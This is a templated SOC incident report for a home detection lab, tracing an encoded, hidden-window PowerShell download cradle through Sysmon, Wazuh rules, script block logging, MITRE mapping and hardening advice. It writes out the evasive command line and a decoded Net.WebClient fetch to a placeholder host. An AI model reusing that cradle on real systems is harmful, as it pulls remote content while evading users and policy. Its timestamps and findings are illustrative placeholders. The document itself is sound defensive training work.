# Incident Report — INC-2026-002

> ## ⚠️ TEMPLATE — NOT A REAL INCIDENT
>
> **This report is a template to be completed with real captured evidence.**
> The SentinelOps lab has **not been built or run**, so no events have been collected.
> Every timestamp, host name, PID, hash, logon ID and metric below is a **placeholder**
> (for example `<TIMESTAMP>`, `<HOSTNAME>`, `<PID>`, `<SHA256>`) or an **illustrative
> expectation** of what the detection should produce — not observed data. Replace all
> placeholders with real evidence from your own lab before treating any of this as findings.


> **LABORATORY DATA.** Generated by the lab owner in an isolated virtual environment using the
> benign script `Invoke-LabPowerShellActivity.ps1`. No malware, no real payload and no external
> infrastructure were involved. The "downloaded file" was a text file served by a lab VM.

---

## 1. Incident summary

| Field | Value |
|---|---|
| **Incident ID** | INC-2026-002 |
| **Date** | <DATE> |
| **Time (UTC)** | First event <TIMESTAMP> · Alert generated <TIMESTAMP> · Triage started <TIMESTAMP> |
| **Alert name** | SentinelOps: PowerShell script block contains a download or in-memory execution cradle on <HOSTNAME> |
| **Wazuh rules** | `100110` (level 3), `100111` (level 10), `100113` (level 12), `100114` (level 10) |
| **Severity** | **High** (Wazuh level 12) — code execution with a network retrieval |
| **Affected host** | `<HOSTNAME>` (<HOST_IP>, agent ID 001) |
| **User** | `<HOSTNAME>\labuser` (standard user, Medium integrity) |
| **Source IP** | N/A for execution · outbound connection to `<SOURCE_IP>:8000` (lab web server) |
| **Detection source** | Sysmon EID 1 and EID 3 · `Microsoft-Windows-PowerShell/Operational` Event ID 4104 |
| **Analyst** | SOC L1 (lab owner) |
| **Final status** | **TEMPLATE (not yet run) — expected verdict once evidence is captured: True Positive (authorised lab simulation), contained** |

---

## 2. Description

At <TIMESTAMP> UTC, `powershell.exe` was launched on `<HOSTNAME>` by the standard user account
`labuser` with a command line combining three evasion-associated switches — a hidden window, a
bypassed execution policy, and a Base64-encoded command:

```
powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand <Base64>
```

Sysmon recorded the process (EID 1) and rule `100111` alerted at Medium. Two seconds later,
PowerShell script block logging (Event ID **4104**) recorded the **decoded** content, which
contained a download cradle using `Net.WebClient`. Rule `100113` escalated the incident to
High. Sysmon EID 3 then confirmed an outbound TCP connection from `powershell.exe` to
`<SOURCE_IP>:8000`, and Sysmon EID 11 recorded a file written to the user's `%TEMP%`.

This is the canonical **"encoded PowerShell download cradle"** pattern. In this lab the
retrieved content was a harmless text file placed on a lab VM for the exercise.

---

## 3. EXPECTED EVIDENCE — Timeline (not yet captured)

| Time | Event | Source | Evidence |
|---|---|---|---|
| <TIMESTAMP> | `explorer.exe` → `cmd.exe` started by `labuser` | Sysmon EID 1 | PID <PID> |
| <TIMESTAMP> | `cmd.exe` → `powershell.exe` with `-nop -w hidden -ExecutionPolicy Bypass -enc …` | Sysmon EID 1 | PID <PID>, rules `100110`, `100111` |
| <TIMESTAMP> | Script block logged (decoded): `$c = New-Object Net.WebClient; $c.DownloadString('http://<SOURCE_IP>:8000/lab-test.txt')` | PowerShell 4104 | **Rule `100113` (level 12)** |
| <TIMESTAMP> | Outbound TCP `powershell.exe` → `<SOURCE_IP>:8000` | Sysmon EID 3 | Rule `100114` |
| <TIMESTAMP> | File created: `C:\Users\labuser\AppData\Local\Temp\lab-test.txt` | Sysmon EID 11 | SHA256 recorded |
| <TIMESTAMP> | High alert visible on the dashboard | Wazuh manager | — |
| <TIMESTAMP> | `powershell.exe` (PID <PID>) terminated — lifetime 7 seconds | Sysmon EID 5 | — |
| <TIMESTAMP> | L1 triage started | Analyst | — |
| <TIMESTAMP> | Base64 decoded offline; intent confirmed | Analyst | See §5 |
| <TIMESTAMP> | Process tree reconstructed; no persistence found | Analyst | — |
| <TIMESTAMP> | `<SOURCE_IP>:8000` blocked at the host firewall; dropped file hashed and removed | Analyst | — |
| <TIMESTAMP> | Incident documented and closed | Analyst | This report |

**MTTD: <NOT YET MEASURED>** **Time to triage: <NOT YET MEASURED>** **Time to contain: <NOT YET MEASURED>**

---

## 4. EXPECTED EVIDENCE — Indicators (not yet captured)

| Type | Value |
|---|---|
| Process | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` (PID <PID>) |
| Command line | `powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA…` |
| Parent process | `C:\Windows\System32\cmd.exe` (PID <PID>) → `explorer.exe` |
| Decoded script | `$c = New-Object Net.WebClient; $c.DownloadString('http://<SOURCE_IP>:8000/lab-test.txt')` |
| Network destination | `<SOURCE_IP>:8000` (lab web server) |
| Dropped file | `C:\Users\labuser\AppData\Local\Temp\lab-test.txt` |
| User | `<HOSTNAME>\labuser`, integrity level **Medium** (not elevated) |
| Process lifetime | 7 seconds |

---

## 5. Investigation

**Q1 — What did the encoded command actually do?**
Decoded **offline** (decoding is not executing):

```powershell
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<BASE64>'))
```

Result: a `Net.WebClient` download cradle pointing at `http://<SOURCE_IP>:8000/lab-test.txt`.
The same content appeared independently in the 4104 script block event — **two independent
sources agreeing is what turns a suspicion into a finding.**

**Q2 — What launched it?**
Process tree reconstructed from `ParentProcessGuid`:

```
explorer.exe (PID <PID>, labuser)
  └── cmd.exe (PID <PID>)
        └── powershell.exe (PID <PID>)  <-- alert
```

The chain terminates at `explorer.exe`, i.e. **a user action at the keyboard**, not a document
macro and not a remote-execution service. Had the parent been `winword.exe`, rule `100112`
would have fired and the incident would have been treated as phishing.

**Q3 — Did the download succeed?**
Yes. Sysmon EID 3 shows the connection to `<SOURCE_IP>:8000` and EID 11 shows the file
written to `%TEMP%`. The file was hashed (SHA256 recorded in the evidence folder) and
confirmed to be the benign lab text file.

**Q4 — Did anything execute from the retrieved content?**
No. `DownloadString` returns text to a variable; there was no `Invoke-Expression`/`IEX` of the
result and no subsequent process creation from PowerShell. Sysmon EID 5 shows the process
exited 7 seconds later with no child processes.

**Q5 — Was there persistence?**
Checked: registry Run keys (Sysmon EID 12/13), Startup folder (EID 11), scheduled tasks
(4698), services (7045), new accounts (4720). **None found.**

**Q6 — Did it run elevated?**
No. `integrityLevel: Medium` and no 4672 for the session. The blast radius was limited to
`labuser`'s own profile.

**Q7 — Any defence tampering?**
Rule `100115` did not fire. Defender exclusions and audit policy were checked manually and were
unchanged.

**Queries used**

```
rule.id:(100110 OR 100111 OR 100113 OR 100114)
data.win.system.eventID:4104 AND agent.name:"<HOSTNAME>"
data.win.eventdata.processGuid:"{...}"          # pivots to EID 3, 11, 5
data.win.eventdata.parentImage:*cmd.exe
```

---

## 6. MITRE ATT&CK mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Execution (TA0002) | Command and Scripting Interpreter: PowerShell | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | `powershell.exe` executed with an encoded command; 4104 script block |
| Defense Evasion (TA0005) | Obfuscated Files or Information: Command Obfuscation | [T1027.010](https://attack.mitre.org/techniques/T1027/010/) | `-EncodedCommand` Base64, `-WindowStyle Hidden`, `-ExecutionPolicy Bypass` |
| Command and Control (TA0011) | Ingress Tool Transfer | [T1105](https://attack.mitre.org/techniques/T1105/) | `Net.WebClient` retrieval to `<SOURCE_IP>:8000`; file written to `%TEMP%` |

Not observed: T1204.002 (parent was `explorer.exe`, not an Office application),
T1053.005 / T1543.003 (no persistence), T1562.001 (no defence tampering).

---

## 7. Findings

1. **An obfuscated PowerShell download cradle executed successfully** under a standard user
   account and retrieved content from a remote host.
2. **Script block logging was decisive.** The command line alone showed only Base64; Event
   4104 revealed the exact URL and method. Without it this alert would have needed manual
   decoding to be actionable — a direct argument for enabling it everywhere.
3. **No second-stage execution occurred.** The retrieved content was stored, not executed.
4. **No elevation and no persistence.** Impact was confined to the `labuser` profile.
5. **Detection layering worked as designed:** Medium on the command line (`100111`) → High on
   the decoded intent (`100113`) → corroboration from the network (`100114`). Each layer
   independently confirmed the others.

---

## 8. Response actions taken

| Time (UTC) | Action | Result |
|---|---|---|
| <TIMESTAMP> | Confirmed the process had already exited (no live containment needed) | Verified |
| <TIMESTAMP> | Dropped file hashed (SHA256) and preserved, then removed | Complete |
| <TIMESTAMP> | Host firewall rule blocking `<SOURCE_IP>:8000` outbound | Applied |
| <TIMESTAMP> | Full Defender scan of the host | Clean |
| <TIMESTAMP> | Verified no persistence (Run keys, tasks, services, accounts) | Clean |
| <TIMESTAMP> | Extended monitoring on `labuser` for 72 h | Enabled |
| <TIMESTAMP> | Documented and closed | Complete |

Escalation was **not** required: no elevation, no persistence, no second stage, single host.
Had `IEX` been present in the script block, this would have been escalated to L2 immediately
as confirmed code execution from a remote source.

---

## 9. Recommendations

| # | Recommendation | Priority | Rationale |
|---|---|---|---|
| 1 | Enable Defender ASR rule *"Block Office applications from creating child processes"* | High | Closes the most common real-world path to this exact chain |
| 2 | Deploy PowerShell **Constrained Language Mode** for standard users | High | Blocks `New-Object Net.WebClient` for non-admins |
| 3 | Remove PowerShell v2 from all endpoints | High | v2 has no script block logging and is used to downgrade-evade it |
| 4 | Add a rule for `IEX`/`Invoke-Expression` **applied to downloaded content** at level 13 | Medium | Separates "downloaded" from "downloaded and executed" |
| 5 | Alert on any `powershell.exe` outbound connection to a non-allowlisted destination | Medium | `100114` currently alerts on all destinations — noisy at scale |
| 6 | Enable AppLocker/WDAC to block execution from `%TEMP%` | Medium | Prevents the natural next step of this chain |
| 7 | Add user-awareness training on copy-pasted PowerShell commands | Low | The parent chain showed a deliberate user action |

---

## 10. Lessons learned

* **Script block logging is the highest-value control in this lab.** It converted an opaque
  Base64 blob into a complete IOC list in one event.
* **Process ancestry decided the severity.** `explorer.exe` as the root made this a
  user-initiated action; `winword.exe` would have made it a phishing incident with a very
  different response.
* **Detection gap identified:** there is no rule distinguishing "content downloaded" from
  "content downloaded and executed". Recommendation #4 raised as SO-DET-002-B.
* **Process termination events (EID 5) mattered** — knowing the process lived only 7 seconds
  ruled out interactive attacker use.

**Final status (TEMPLATE — pending real captured evidence): EXPECTED verdict is CLOSED — True Positive (authorised laboratory simulation), contained, no
compromise.**
